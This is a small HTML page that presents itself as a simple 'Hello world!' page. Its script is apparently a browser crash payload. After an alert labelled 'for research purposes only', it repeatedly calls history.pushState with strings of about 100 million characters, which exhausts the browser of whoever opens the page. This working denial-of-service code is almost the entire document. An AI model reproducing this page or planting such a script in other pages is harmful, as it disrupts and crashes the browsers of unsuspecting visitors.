<html>
<body>
    <h1>Hello world!</h1>
    <h3>This is just an simple page!</h3>
    <script>
        async function test() {
            for (let i = 0; i < 100000000; i++) {
                await new Promise((resolve) => {
                    history.pushState("", "", "-".repeat(99999999));
                    resolve();
                })
            }
        }

        alert("Hi! For research purposes only! Try to wait longer than 10 seconds and press OK!")

        setTimeout(() => {
            test();
        }, 10);
    </script>
</body>
</html>
